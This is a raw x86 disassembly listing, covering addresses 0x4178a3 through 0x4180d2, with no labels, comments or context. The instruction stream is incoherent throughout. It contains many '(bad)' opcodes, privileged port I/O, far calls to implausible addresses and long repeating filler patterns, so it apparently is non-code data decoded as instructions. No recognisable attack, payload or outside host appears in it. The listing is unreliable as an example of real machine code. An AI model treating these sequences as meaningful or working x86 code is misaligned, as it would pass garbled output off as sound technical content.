  4178a3:	add    al,ch
  4178a5:	int3   
  4178a6:	and    ecx,DWORD PTR [esi-0x13]
  4178a9:	enter  0x1f,0xc8
  4178ad:	sub    ecx,DWORD PTR [ecx]
  4178af:	add    BYTE PTR [ebx+ebp*1+0x2b8c0009],cl
  4178b6:	out    0x62,eax
  4178b8:	aam    0x90
  4178ba:	or     al,0x51
  4178bc:	mov    ebx,0xad753089
  4178c1:	jge    0x4178e2
  4178c3:	pop    esp
  4178c4:	jecxz  0x41784a
  4178c6:	sub    dl,BYTE PTR [edx-0x33]
  4178c9:	jge    0x4178d7
  4178cb:	ins    DWORD PTR es:[edi],dx
  4178cc:	pushf  
  4178cd:	mov    BYTE PTR [edx],ch
  4178cf:	add    BYTE PTR [ebp-0x587ff6d5],cl
  4178d5:	dec    eax
  4178d6:	cmp    ebp,DWORD PTR [esi-0x57]
  4178d9:	inc    edi
  4178da:	(bad)  
  4178db:	xor    DWORD PTR [edx-0x7393eab9],edi
  4178e1:	loop   0x41793f
  4178e3:	push   ecx
  4178e4:	push   ebx
  4178e5:	dec    eax
  4178e6:	cmp    eax,0x13df6f3f
  4178eb:	jbe    0x41795e
  4178ed:	out    dx,al
  4178ee:	sub    DWORD PTR [esi+0x5f],ebp
  4178f1:	ficom  DWORD PTR [ebx+eiz*2]
  4178f4:	aas    
  4178f5:	xchg   esp,eax
  4178f6:	test   BYTE PTR [esi],dh
  4178f8:	pop    ebp
  4178f9:	stos   DWORD PTR es:[edi],eax
  4178fa:	xchg   BYTE PTR [ecx],ah
  4178fc:	push   ebx
  4178fd:	mov    al,0xdf
  4178ff:	push   ebx
  417900:	ds test eax,0xa53d2882
  417906:	mov    eax,0x27
	...
  41791b:	add    BYTE PTR [eax-0x57],bl
  41791e:	xchg   edx,eax
  41791f:	sub    BYTE PTR ds:0x322288a5,bl
  417925:	retf   
  417926:	mov    eax,DWORD PTR [ebx]
  417928:	mov    WORD PTR [edx-0x5bccc7bc],gs
  41792e:	pop    eax
  41792f:	cmc    
  417930:	mov    ebp,0xf020436a
  417935:	xchg   esp,eax
  417936:	adc    eax,0x2fd40027
  41793b:	sbb    ecx,esi
  41793d:	lahf   
  41793e:	dec    ebp
  41793f:	sub    ch,bh
  417941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417942:	and    eax,0xdfafef36
  417947:	inc    ecx
  417948:	out    dx,eax
  417949:	mov    al,ds:0xa6ef3534
  41794e:	sub    al,0x22
  417950:	mov    edi,0xb103dfa7
  417955:	test   al,0xc
  417957:	cmc    
  417958:	jge    0x4179c4
  41795a:	add    esp,DWORD PTR [eax]
  41795c:	mov    al,ds:0xb1381294
  417961:	leave  
  417962:	out    dx,eax
  417963:	es mov dl,0xc5
  417966:	sti    
  417967:	and    BYTE PTR [esi-0x73d9394d],bl
  41796d:	xchg   esp,eax
  41796e:	shl    BYTE PTR [edi],0x82
  417971:	mov    bl,0xcf
  417973:	sbb    bh,BYTE PTR [ebp+0x6827f566]
  417979:	test   al,0xdf
  41797b:	inc    edx
  41797c:	pusha  
  41797d:	test   al,0xc6
  41797f:	and    al,0x0
	...
  417991:	add    BYTE PTR [eax],al
  417993:	add    BYTE PTR [ebx-0x60],cl
  417996:	or     ah,cl
  417998:	dec    esi
  417999:	stos   BYTE PTR es:[edi],al
  41799a:	ins    BYTE PTR es:[edi],dx
  41799b:	mov    al,ds:0x907cb1ad
  4179a0:	scas   al,BYTE PTR es:[edi]
  4179a1:	test   al,0x5f
  4179a3:	mov    ds:0x8d5fc372,eax
  4179a8:	(bad)  
  4179a9:	shl    DWORD PTR [eax-0x7c],cl
  4179ac:	jo     0x417959
  4179ae:	pop    esp
  4179af:	xchg   esi,eax
  4179b0:	nop
  4179b1:	mov    ch,0x66
  4179b3:	lods   al,BYTE PTR ds:[esi]
  4179b4:	jb     0x417963
  4179b6:	push   0xffffff8c
  4179b8:	pop    ecx
  4179b9:	mov    ds:0x945f8060,eax
  4179be:	dec    esi
  4179bf:	pop    ebx
  4179c0:	imul   esi,DWORD PTR [ebp-0x6b4bafa7],0x49
  4179c7:	pop    ebx
  4179c8:	stos   DWORD PTR es:[edi],eax
  4179c9:	mov    al,0x4b
  4179cb:	aas    
  4179cc:	ret    
  4179cd:	stos   DWORD PTR es:[edi],eax
  4179ce:	imul   edi,DWORD PTR [ebx],0xffffffaf
  4179d1:	mov    al,ds:0xd590286b
  4179d6:	jp     0x417a24
  4179d8:	mov    ah,0xce
  4179da:	jp     0x417a20
  4179dc:	mov    bl,0x94
  4179de:	dec    ecx
  4179df:	sbb    esp,DWORD PTR [edi+0x73267ca4]
  4179e5:	mov    al,ds:0xa26b1a5b
  4179ea:	inc    ecx
  4179eb:	add    al,0x67
  4179ed:	xchg   esp,eax
  4179ee:	dec    ecx
  4179ef:	sti    
  4179f0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179f2:	jl     0x417a18
  4179f4:	js     0x41799a
  4179f6:	gs sti 
	...
  417a0c:	pop    ebx
  417a0d:	int    0x6b
  417a0f:	lock (bad) 
  417a11:	aad    0x7a
  417a13:	loopne 0x417a74
  417a15:	mov    al,ds:0xa0c0c44c
  417a1a:	jp     0x4179e2
  417a1c:	mov    dh,0xcd
  417a1e:	imul   edx,eax,0xffffff8f
  417a21:	aad    0x7a
  417a23:	add    ah,cl
  417a25:	arpl   WORD PTR [edx+edx*2-0x30],di
  417a29:	ja     0x417a94
  417a2b:	popa   
  417a2c:	outs   dx,DWORD PTR es:[esi]
  417a2e:	inc    edi
  417a2f:	outs   dx,DWORD PTR ds:[esi]
  417a30:	sbb    esp,DWORD PTR [eax+0x69]
  417a33:	js     0x417a26
  417a35:	xchg   ebx,eax
  417a36:	pop    edx
  417a37:	and    ebp,DWORD PTR gs:[edi+0x7a]
  417a3b:	je     0x417a3e
  417a3d:	jne    0x417a96
  417a3f:	cmp    DWORD PTR gs:[ebp+0x8],ebp
  417a43:	dec    edi
  417a44:	xor    eax,0x2750666e
  417a49:	je     0x417ab2
  417a4b:	gs es pusha 
  417a4e:	pop    esp
  417a4f:	outs   dx,DWORD PTR ds:[esi]
  417a50:	push   cs
  417a51:	outs   dx,DWORD PTR ds:[esi]
  417a52:	data16 add BYTE PTR [ebp+esi*2+0x78],bl
  417a57:	gs out 0x63,eax
  417a5a:	arpl   WORD PTR [esi-0x2c],bp
  417a5d:	pop    esp
  417a5e:	imul   ecx,DWORD PTR [edx+edi*4+0x6f],0x57c1656b
  417a66:	push   bp
  417a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a69:	ins    DWORD PTR es:[edi],dx
  417a6a:	jp     0x417a6c
  417a6c:	mov    dl,0x6d
  417a6e:	jl     0x417ac4
	...
  417a84:	call   0x6e76:0x9c6e697b
  417a8b:	outs   dx,DWORD PTR ds:[esi]
  417a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8d:	jne    0x417ae4
  417a8f:	je     0x417a1d
  417a91:	ja     0x417af9
  417a93:	add    BYTE PTR [esi+0x77],ah
  417a96:	data16 jbe 0x417a19
  417a99:	bound  edi,QWORD PTR [ebx+edx*2+0x7c]
  417a9d:	ins    BYTE PTR es:[edi],dx
  417a9e:	pop    esp
  417a9f:	outs   dx,DWORD PTR ds:[esi]
  417aa0:	xchg   BYTE PTR [edx+edi*2+0x69],bl
  417aa4:	sbb    ebp,DWORD PTR [esi+0x57]
  417aa7:	imul   eax,DWORD PTR [ecx-0x30],0x6dda4c08
  417aae:	arpl   WORD PTR [esi-0x74],bp
  417ab1:	fdivr  DWORD PTR [ecx]
  417ab3:	arpl   WORD PTR [esi-0x14],di
  417ab6:	or     BYTE PTR [ebx+eiz*2+0x3e],cl
  417aba:	adc    dh,BYTE PTR [ebx+0x5c]
  417abd:	std    
  417abe:	ss addr16 pop edx
  417ac1:	push   esp
  417ac2:	adc    eax,0x5b507363
  417ac7:	pop    edi
  417ac8:	pusha  
  417ac9:	clc    
  417aca:	pop    ds
  417acb:	aas    
  417acc:	mov    esp,gs
  417ace:	sub    al,0x6a
  417ad0:	cmp    edx,edi
  417ad2:	cmp    al,0x54
  417ad4:	sub    edx,DWORD PTR [edx]
  417ad6:	and    BYTE PTR [esi+0x5c],ch
  417ad9:	fwait
  417ada:	adc    al,0x76
  417adc:	xor    eax,0x29652009
  417ae1:	call   0x7024:0x9b2f0009
	...
  417afc:	sbb    BYTE PTR [edx-0x6],bh
  417aff:	sub    eax,0x28c7f0
  417b04:	iret   
  417b05:	mov    ecx,0x61007023
  417b0a:	push   ss
  417b0b:	jo     0x417b0b
  417b0d:	mov    esi,0x5fef6330
  417b12:	inc    eax
  417b13:	pop    edi
  417b14:	fmul   st,st(4)
  417b16:	or     al,0x41
  417b18:	icebp  
  417b19:	pop    ecx
  417b1a:	xor    BYTE PTR [ebp-0x24],cl
  417b1d:	mov    BYTE PTR [esi],dl
  417b1f:	push   ecx
  417b20:	lds    edi,FWORD PTR [edx+0x30]
  417b23:	arpl   WORD PTR [ecx-0x4192cfa6],si
  417b29:	nop
  417b2a:	dec    ebx
  417b2b:	add    bh,cl
  417b2d:	mov    BYTE PTR [edx],bh
  417b2f:	je     0x417b02
  417b31:	test   DWORD PTR [edi],ebp
  417b33:	imul   ecx,edi,0xffffff88
  417b36:	cmp    dh,BYTE PTR [ebp+eiz*4-0x73]
  417b3a:	adc    esp,DWORD PTR [ecx-0x53]
  417b3d:	xchg   esp,eax
  417b3e:	shr    DWORD PTR [eax],cl
  417b40:	jge    0x417b0d
  417b42:	lds    edx,FWORD PTR [edx+0x78]
  417b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b46:	shr    DWORD PTR [eax],1
  417b48:	mov    ecx,ss
  417b4a:	int3   
  417b4b:	xor    DWORD PTR [eax-0x2f],edi
  417b4e:	fistp  DWORD PTR [esi]
  417b50:	pop    ebp
  417b51:	scas   eax,DWORD PTR es:[edi]
  417b52:	xchg   edx,eax
  417b53:	aaa    
  417b54:	jno    0x417af8
  417b56:	les    eax,FWORD PTR [ebx]
  417b58:	dec    ebp
  417b59:	mov    ds:0xd35833b8,al
  417b5e:	xor    BYTE PTR [eax+eax*1],0x0
	...
  417b72:	add    BYTE PTR [eax],al
  417b74:	aas    
  417b75:	stos   DWORD PTR es:[edi],eax
  417b76:	xchg   ecx,eax
  417b77:	sub    BYTE PTR [ebp-0x51],cl
  417b7a:	xchg   ecx,eax
  417b7b:	aaa    
  417b7c:	xor    ebp,DWORD PTR [esi-0x5facdd78]
  417b82:	test   BYTE PTR [ebx+0x1e],dl
  417b85:	stos   DWORD PTR es:[edi],eax
  417b86:	jge    0x417bac
  417b88:	sbb    BYTE PTR [edi-0x6bdcd756],ch
  417b8e:	fbld   TBYTE PTR [eax]
  417b90:	sbb    eax,0xf8281dab
  417b95:	test   al,0xdf
  417b97:	ds std 
  417b99:	stos   DWORD PTR es:[edi],eax
  417b9a:	es daa 
  417b9c:	add    dl,dl
  417b9e:	ss pop ds
  417ba0:	cld    
  417ba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba2:	pop    ebp
  417ba3:	daa    
  417ba4:	cli    
  417ba5:	mov    al,ds:0xacd8230f
  417baa:	and    BYTE PTR [esp+ecx*4],al
  417bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bae:	xor    bh,BYTE PTR [eax]
  417bb0:	loope  0x417b54
  417bb2:	add    al,0x21
  417bb4:	jp     0x417b66
  417bb6:	add    esp,DWORD PTR [eax]
  417bb8:	mov    esp,es
  417bba:	xor    bh,BYTE PTR [eax]
  417bbc:	test   eax,0xbe410ca2
  417bc1:	scas   eax,DWORD PTR es:[edi]
  417bc2:	add    BYTE PTR [eax],bh
  417bc4:	scas   eax,DWORD PTR es:[edi]
  417bc5:	retf   
  417bc6:	add    eax,0x8b39831
  417bcb:	pop    es
  417bcc:	ins    DWORD PTR es:[edi],dx
  417bcd:	mov    cl,0x8
  417bcf:	jmp    0xe94a1063
  417bd4:	(bad)  
  417bd5:	xchg   esp,eax
  417bd6:	or     cl,ch
	...
  417bec:	(bad)  
  417bed:	xchg   esp,eax
  417bee:	or     cl,ch
  417bf0:	(bad)  
  417bf1:	xchg   esp,eax
  417bf2:	or     cl,ch
  417bf4:	(bad)  
  417bf5:	xchg   esp,eax
  417bf6:	or     cl,ch
  417bf8:	(bad)  
  417bf9:	xchg   esp,eax
  417bfa:	or     cl,ch
  417bfc:	(bad)  
  417bfd:	xchg   esp,eax
  417bfe:	or     cl,ch
  417c00:	(bad)  
  417c01:	xchg   esp,eax
  417c02:	or     cl,ch
  417c04:	(bad)  
  417c05:	xchg   esp,eax
  417c06:	or     cl,ch
  417c08:	(bad)  
  417c09:	xchg   esp,eax
  417c0a:	or     cl,ch
  417c0c:	(bad)  
  417c0d:	xchg   esp,eax
  417c0e:	or     cl,ch
  417c10:	(bad)  
  417c11:	xchg   esp,eax
  417c12:	or     cl,ch
  417c14:	(bad)  
  417c15:	xchg   esp,eax
  417c16:	or     cl,ch
  417c18:	(bad)  
  417c19:	xchg   esp,eax
  417c1a:	or     cl,ch
  417c1c:	(bad)  
  417c1d:	xchg   esp,eax
  417c1e:	or     cl,ch
  417c20:	(bad)  
  417c21:	xchg   esp,eax
  417c22:	or     cl,ch
  417c24:	(bad)  
  417c25:	xchg   esp,eax
  417c26:	or     cl,ch
  417c28:	(bad)  
  417c29:	xchg   esp,eax
  417c2a:	or     cl,ch
  417c2c:	(bad)  
  417c2d:	xchg   esp,eax
  417c2e:	or     cl,ch
  417c30:	(bad)  
  417c31:	xchg   esp,eax
  417c32:	or     cl,ch
  417c34:	(bad)  
  417c35:	xchg   esp,eax
  417c36:	or     cl,ch
  417c38:	(bad)  
  417c39:	xchg   esp,eax
  417c3a:	or     cl,ch
  417c3c:	(bad)  
  417c3d:	xchg   esp,eax
  417c3e:	or     cl,ch
  417c40:	(bad)  
  417c41:	xchg   esp,eax
  417c42:	or     cl,ch
  417c44:	(bad)  
  417c45:	xchg   esp,eax
  417c46:	or     cl,ch
  417c48:	(bad)  
  417c49:	xchg   esp,eax
  417c4a:	or     cl,ch
  417c4c:	(bad)  
  417c4d:	xchg   esp,eax
  417c4e:	or     cl,ch
	...
  417c64:	(bad)  
  417c65:	xchg   esp,eax
  417c66:	or     cl,ch
  417c68:	(bad)  
  417c69:	xchg   esp,eax
  417c6a:	or     BYTE PTR [eax],al
  417c6c:	xor    eax,0x916560c5
  417c71:	mov    ah,0x37
  417c73:	xor    dl,BYTE PTR [ebx-0x44]
  417c76:	fs ins BYTE PTR es:[edi],dx
  417c78:	and    eax,0xd8474065
  417c7d:	retf   
  417c7e:	dec    esi
  417c7f:	outs   dx,DWORD PTR ds:[esi]
  417c80:	sar    DWORD PTR [ebx-0x48ca8d97],1
  417c86:	jl     0x417cf0
  417c88:	and    al,0x98
  417c8a:	or     BYTE PTR [eax],al
  417c8c:	cmc    
  417c8d:	xchg   edi,eax
  417c8e:	or     BYTE PTR [ebx],ah
  417c90:	xor    DWORD PTR [edi+0x8],edx
  417c93:	cmp    BYTE PTR [ecx],dh
  417c95:	push   edi
  417c96:	or     BYTE PTR [eax-0xf],cl
  417c99:	push   esi
  417c9a:	or     BYTE PTR [esi+0x1],bl
  417c9d:	push   edi
  417c9e:	or     BYTE PTR [ecx+esi*8+0x56],ch
  417ca2:	or     BYTE PTR [ecx+esi*8+0x56],bh
  417ca6:	or     BYTE PTR [ecx+edx*1-0x1e5ef7a9],cl
  417cad:	push   esi
  417cae:	or     BYTE PTR [eax-0x33f7a90f],bh
  417cb4:	icebp  
  417cb5:	push   esi
  417cb6:	or     ch,ah
  417cb8:	icebp  
  417cb9:	push   esi
  417cba:	or     BYTE PTR [ecx],cl
  417cbc:	rcr    BYTE PTR [ecx+0x8],0x26
  417cc0:	mov    al,0x59
  417cc2:	or     BYTE PTR [eax],al
  417cc4:	gs xchg edi,eax
  417cc6:	or     BYTE PTR [ecx],al
	...
  417cdc:	gs xchg edi,eax
  417cde:	mov    BYTE PTR ds:0x4d089775,al
  417ce4:	int3   
  417ce5:	clc    
  417ce6:	dec    eax
  417ce7:	outs   dx,DWORD PTR ds:[esi]
  417ce8:	mov    ch,0x61
  417ceb:	gs xchg ebx,eax
  417ced:	les    esi,FWORD PTR [edi+0x0]
  417cf0:	xor    al,0x97
  417cf2:	or     BYTE PTR [eax+0x8988f],al
  417cf8:	mov    WORD PTR [esp+edi*1+0x389cc870],?
  417cff:	pop    edi
  417d00:	mov    esp,?
  417d02:	or     BYTE PTR [eax],al
  417d04:	or     al,0xf1
  417d06:	or     BYTE PTR [eax],al
  417d08:	mov    WORD PTR [ecx+0x11ad6111],?
  417d0e:	jmp    0x352ef951
  417d13:	pop    edi
  417d14:	js     0x417cf2
  417d16:	or     bh,bh
  417d18:	sti    
  417d19:	cld    
  417d1a:	mov    BYTE PTR [eax],ah
  417d1c:	mov    ebp,?
  417d1e:	or     BYTE PTR [ecx+0x6d],al
  417d21:	ficom  WORD PTR [eax]
  417d23:	arpl   WORD PTR [esp+edi*8-0x63f3fff8],cx
  417d2a:	or     al,0x0
  417d2c:	mov    WORD PTR [esi],?
  417d2e:	adc    ch,BYTE PTR [ebp+0x37]
  417d31:	and    al,0x28
  417d33:	jno    0x417cc1
  417d35:	cld    
  417d36:	or     BYTE PTR [eax],al
  417d38:	or     al,0xdf
  417d3a:	or     BYTE PTR [eax],al
  417d3c:	mov    WORD PTR ds:0x7114,?
	...
  417d52:	add    BYTE PTR [eax],al
  417d54:	and    BYTE PTR [edx],ch
  417d56:	cmp    esi,DWORD PTR [edi-0x74]
  417d59:	dec    DWORD PTR [eax]
  417d5b:	add    BYTE PTR [eax+eax*1],cl
  417d5e:	or     DWORD PTR [eax],eax
  417d60:	mov    WORD PTR [eax],?
  417d62:	and    al,0x20
  417d64:	shr    BYTE PTR [edx+0x2d],1
  417d67:	jae    0x417d5a
  417d69:	pop    eax
  417d6a:	adc    dh,BYTE PTR [edi+edi*8-0x5]
  417d6e:	or     al,BYTE PTR [eax]
  417d70:	mov    WORD PTR [ebx-0x12],?
  417d73:	jmp    FWORD PTR [ebx-0x4]
  417d76:	dec    ebp
  417d77:	ins    DWORD PTR es:[edi],dx
  417d78:	icebp  
  417d79:	pusha  
  417d7a:	adc    DWORD PTR [esi-0x54],ebp
  417d7d:	mov    esp,0x5cc8703c
  417d82:	cmp    BYTE PTR [edi-0x74],bl
  417d85:	xchg   esp,eax
  417d86:	loopne 0x417d8b
  417d88:	mov    WORD PTR [esi+ecx*8],ss
  417d8b:	add    ecx,DWORD PTR [esp+edx*4+0x646c2d2c]
  417d92:	or     BYTE PTR [edi],ah
  417d94:	mov    al,ds:0x9d20f187
  417d99:	xchg   esp,eax
  417d9a:	loope  0x417d9f
  417d9c:	mov    WORD PTR [ecx*8+0x22948c03],ss
  417da3:	sbb    esi,DWORD PTR [edi+0x7f]
  417da6:	ficomp WORD PTR [ecx]
  417da8:	lods   al,BYTE PTR ds:[esi]
  417da9:	pop    eax
  417daa:	(bad)  
  417dab:	es jg  0x417e2d
  417dae:	les    ebx,FWORD PTR [ecx]
  417db0:	js     0x417d37
  417db2:	fild   WORD PTR ds:0xda5f948c
	...
  417dcc:	jecxz  0x417ddf
  417dce:	fild   WORD PTR [esi+0x69]
  417dd1:	jg     0x417d9f
  417dd3:	sbb    ah,BYTE PTR [edx-0x4c]
  417dd6:	mov    al,ds:0x9d7b371f
  417ddb:	sbb    al,0x3d
  417ddd:	mov    BYTE PTR [ecx-0x6a84bfdc],dl
  417de3:	and    BYTE PTR [eax+ebp*2+0x76],ch
  417de7:	sbb    bh,BYTE PTR [eax]
  417de9:	test   edi,ebx
  417deb:	add    al,0x8c
  417ded:	xchg   esp,eax
  417dee:	pop    edi
  417def:	repz fwait
  417df1:	adc    edi,ebx
  417df3:	inc    esp
  417df4:	sub    BYTE PTR [edi-0x78],bh
  417df7:	sbb    ebx,esi
  417df9:	test   DWORD PTR [ebx+0x36],edx
  417dfc:	jecxz  0x417d86
  417dfe:	pop    eax
  417dff:	xor    ch,bh
  417e01:	mov    ah,0x33
  417e03:	sbb    ecx,esp
  417e05:	adc    BYTE PTR [edx+0x4],0x6b
  417e09:	adc    edi,ebx
  417e0b:	or     DWORD PTR [edi-0x43fc206c],0x77
  417e12:	or     BYTE PTR [ebx],bh
  417e14:	cdq    
  417e15:	jg     0x417e7d
  417e17:	dec    eax
  417e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e19:	xchg   esp,eax
  417e1a:	pop    ecx
  417e1b:	push   ss
  417e1c:	outs   dx,BYTE PTR ds:[esi]
  417e1d:	mov    BYTE PTR [ebp+0x8],bh
  417e20:	xor    BYTE PTR [ebp+0x54],0x24
  417e24:	xchg   edi,eax
  417e25:	jae    0x417ea1
  417e27:	(bad)  
  417e28:	pusha  
  417e29:	jg     0x417e99
  417e2b:	std    
  417e2c:	retf   
  417e2d:	addr16 pop edi
  417e2f:	sldt   WORD PTR [eax]
	...
  417e42:	add    BYTE PTR [eax],al
  417e44:	ins    BYTE PTR es:[edi],dx
  417e45:	jg     0x417ec4
  417e47:	cli    
  417e48:	retf   
  417e49:	push   ebx
  417e4a:	jnp    0x417e47
  417e4c:	shl    DWORD PTR [ebp+0x66],0xdd
  417e50:	pop    ebp
  417e51:	jne    0x417ecd
  417e53:	ficom  DWORD PTR [esi-0x4d4a9981]
  417e59:	mov    WORD PTR [eax-0x43],?
  417e5c:	test   BYTE PTR [esi+0x634bbb6b],al
  417e62:	pusha  
  417e63:	les    eax,FWORD PTR [ebx+0x74af2880]
  417e69:	sub    BYTE PTR [esp+eax*8-0x7f],0x83
  417e6e:	or     BYTE PTR [edi+esi*2-0x7e719b7c],cl
  417e75:	jne    0x417ef1
  417e77:	(bad)  
  417e78:	xchg   edx,eax
  417e79:	mov    WORD PTR [ebx-0x17],gs
  417e7c:	inc    eax
  417e7d:	mov    ebp,0xbdb2d437
  417e82:	aaa    
  417e83:	ror    DWORD PTR [edi-0x7016f76c],0x63
  417e8a:	imul   esp,DWORD PTR [eax+0x5b6b84a2],0xffffffb9
  417e91:	and    DWORD PTR [esi+0x48],0x5b5873bc
  417e98:	xchg   edi,eax
  417e99:	xchg   BYTE PTR [edi+0x3d],bl
  417e9c:	mov    edi,DWORD PTR [ecx+0x6b]
  417e9f:	add    BYTE PTR [ebp+0x69],dh
  417ea2:	imul   edx,DWORD PTR [esi+eax*8-0x4a],0x7258
	...
  417eba:	add    BYTE PTR [eax],al
  417ebc:	int3   
  417ebd:	ret    0x6c6d
  417ec0:	shl    BYTE PTR [ebp-0x5079ff97],1
  417ec6:	inc    edi
  417ec7:	push   0x656baa84
  417ecc:	imul   ebp,DWORD PTR [ebp-0x446c9684],0x58
  417ed3:	jb     0x417f51
  417ed5:	ret    0x6c6d
  417ed8:	nop
  417ed9:	mov    ch,0x69
  417edb:	add    BYTE PTR [esi-0x51],dh
  417ede:	inc    edi
  417edf:	jb     0x417e71
  417ee1:	mov    bl,0x7c
  417ee3:	gs inc ecx
  417ee5:	lods   eax,DWORD PTR ds:[esi]
  417ee6:	pop    edi
  417ee7:	gs retf 
  417ee9:	arpl   WORD PTR [edx+0x69],di
  417eec:	shr    DWORD PTR [edx-0x512d9a9c],cl
  417ef2:	or     BYTE PTR [ebx-0x30],dl
  417ef5:	pop    ecx
  417ef6:	push   ebp
  417ef7:	arpl   WORD PTR [esi+0x175078be],di
  417efd:	stos   DWORD PTR es:[edi],eax
  417efe:	jle    0x417f69
  417f00:	or     DWORD PTR [edi+0x68b5656b],ebp
  417f06:	imul   edx,DWORD PTR [edx+0x10],0x176f7cc9
  417f0d:	scas   eax,DWORD PTR es:[edi]
  417f0e:	pop    eax
  417f0f:	jb     0x417f1d
  417f11:	(bad)  
  417f12:	ins    DWORD PTR es:[edi],dx
  417f13:	ins    BYTE PTR es:[edi],dx
  417f14:	adc    BYTE PTR [ebp-0x5109ff97],dh
  417f1a:	dec    ebp
  417f1b:	outs   dx,BYTE PTR ds:[esi]
  417f1c:	push   es
  417f1d:	retf   0x6169
	...
  417f34:	push   es
  417f35:	scas   eax,DWORD PTR es:[edi]
  417f36:	inc    ebp
  417f37:	jne    0x417f13
  417f39:	les    edx,FWORD PTR [ebp+0x50]
  417f3c:	xlat   BYTE PTR ds:[ebx]
  417f3d:	mov    cl,0x7e
  417f3f:	imul   ecx,DWORD PTR [ecx+ebx*2-0x20e9ad9],0xcacd6359
  417f4a:	cmp    DWORD PTR [edi-0xd],esp
  417f4d:	pop    edi
  417f4e:	pop    esp
  417f4f:	jb     0x417f36
  417f51:	pop    eax
  417f52:	sub    esi,DWORD PTR [edx-0x3b]
  417f55:	test   eax,0xa7a9691d
  417f5a:	pop    esp
  417f5b:	jb     0x417f02
  417f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f5e:	adc    ebp,DWORD PTR [ecx+ebp*4-0x62]
  417f62:	daa    
  417f63:	add    BYTE PTR [ebp+ecx*8-0x2247aec3],cl
  417f6a:	out    0x70,eax
  417f6c:	ins    BYTE PTR es:[edi],dx
  417f6d:	lds    ebx,FWORD PTR [eax+0x54]
  417f70:	mov    esp,0xbc2dfbd6
  417f75:	lock out dx,al
  417f77:	inc    edi
  417f78:	jae    0x417f64
  417f7a:	and    al,0x3a
  417f7c:	lods   al,BYTE PTR ds:[esi]
  417f7d:	cwde   
  417f7e:	cmp    DWORD PTR [ebx],ecx
  417f80:	xchg   BYTE PTR [edx+ebp*1],bh
  417f83:	popa   
  417f84:	jno    0x417f73
  417f86:	and    al,0x3a
  417f88:	lods   al,BYTE PTR ds:[esi]
  417f89:	mov    ds:0x38929dd,eax
  417f8e:	dec    esp
  417f8f:	popa   
  417f90:	outs   dx,DWORD PTR ds:[esi]
  417f91:	loopne 0x417fcb
  417f93:	je     0x41800e
  417f95:	cmp    BYTE PTR [ebx],bl
  417f97:	popa   
	...
  417fac:	xor    esp,DWORD PTR [ecx]
  417fae:	adc    al,0x6e
  417fb0:	xor    esi,ebx
  417fb2:	call   0x1b61a81d
  417fb7:	je     0x417fee
  417fb9:	sub    DWORD PTR [esp+ebp*1],esp
  417fbc:	ins    BYTE PTR es:[edi],dx
  417fbd:	jecxz  0x417fa0
  417fbf:	outs   dx,BYTE PTR ds:[esi]
  417fc0:	pop    ecx
  417fc1:	dec    ebp
  417fc2:	lock or DWORD PTR [edi+0x16],ecx
  417fc6:	sbb    esi,DWORD PTR [ecx+esi*8-0x73]
  417fca:	and    eax,0x4494d02b
  417fcf:	push   ss
  417fd0:	icebp  
  417fd1:	mov    BYTE PTR [edi-0x16],dl
  417fd4:	xchg   ebx,eax
  417fd5:	mov    bh,0x4b
  417fd7:	xor    DWORD PTR [edi-0xde8dd66],edx
  417fdd:	jle    0x418023
  417fdf:	and    esp,eax
  417fe1:	jnp    0x418029
  417fe3:	push   ss
  417fe4:	xchg   esi,eax
  417fe5:	mov    ah,0x42
  417fe7:	sbb    BYTE PTR [ecx-0x6a06b37f],bh
  417fed:	push   ecx
  417fee:	push   ds
  417fef:	push   ss
  417ff0:	shl    BYTE PTR [edi+0x5],0x30
  417ff4:	addr16 push 0xcaaf3418
  417ffa:	mov    edi,0x1b849c24
  417fff:	sbb    eax,0x1cfb73ad
  418004:	mov    eax,ds:0x6d16ce7e
  418009:	mov    BYTE PTR [eax+esi*1],cl
  41800c:	mov    bh,0x81
  41800e:	shl    DWORD PTR [ecx],cl
	...
  418024:	outs   dx,DWORD PTR ds:[esi]
  418025:	jae    0x417feb
  418027:	clc    
  418028:	test   DWORD PTR [ecx-0x32],edx
  41802b:	adc    eax,0x2fb57760
  418030:	mov    bh,0x57
  418032:	frstor [edx]
  418034:	imul   edi,DWORD PTR [eax-0x28],0xffca6915
  41803b:	and    DWORD PTR [ebx],esi
  41803d:	jle    0x417fff
  41803f:	xor    DWORD PTR [ebx],edi
  418041:	lahf   
  418042:	stc    
  418043:	push   eax
  418044:	cmp    eax,0x72d89177
  418049:	jne    0x417fcf
  41804b:	adc    eax,0x38bfca20
  418050:	xor    DWORD PTR [edx+0x73281798],ecx
  418056:	(bad)  
  418057:	out    dx,eax
  418058:	popa   
  418059:	les    ecx,FWORD PTR [eax]
  41805b:	leave  
  41805c:	addr16 je 0x4180c4
  41805f:	jl     0x418020
  418061:	ins    DWORD PTR es:[edi],dx
  418062:	jl     0x4180b4
  418064:	scas   al,BYTE PTR es:[edi]
  418065:	sub    BYTE PTR [ebx+0x22],0x68
  418069:	pop    edx
  41806a:	pop    ecx
  41806b:	and    BYTE PTR [ebx+0x5fff3bb4],ch
  418071:	int3   
  418072:	sub    BYTE PTR [esi],bl
  418074:	ja     0x4180f4
  418076:	ins    BYTE PTR es:[edi],dx
  418077:	dec    esi
  418078:	mov    eax,ds:0x37f02883
  41807d:	mov    dh,0x3
  41807f:	jecxz  0x4180bb
  418081:	fwait
  418082:	or     BYTE PTR [edx],ch
  418084:	mov    eax,ds:0x47c7e
	...
  418099:	add    BYTE PTR [eax],al
  41809b:	add    BYTE PTR [edx-0x74dadc78],bl
  4180a1:	jle    0x418110
  4180a3:	adc    eax,0x3508ca80
  4180a8:	xor    DWORD PTR [ebx+0x67],0x667f76f5
  4180af:	mov    bl,0x8f
  4180b1:	push   edi
  4180b2:	dec    ebx
  4180b3:	adc    eax,0x979b1e8
  4180b8:	mov    eax,0xd8b95c68
  4180bd:	mov    ebp,0x9ae31926
  4180c2:	inc    eax
  4180c3:	mov    esi,0x932889c
  4180c8:	mov    ebx,0x4ef30383
  4180cd:	jae    0x418138
  4180cf:	int3   
  4180d0:	jg     0x41805a
  4180d2:	xor    cl,BYTE PTR [ecx]
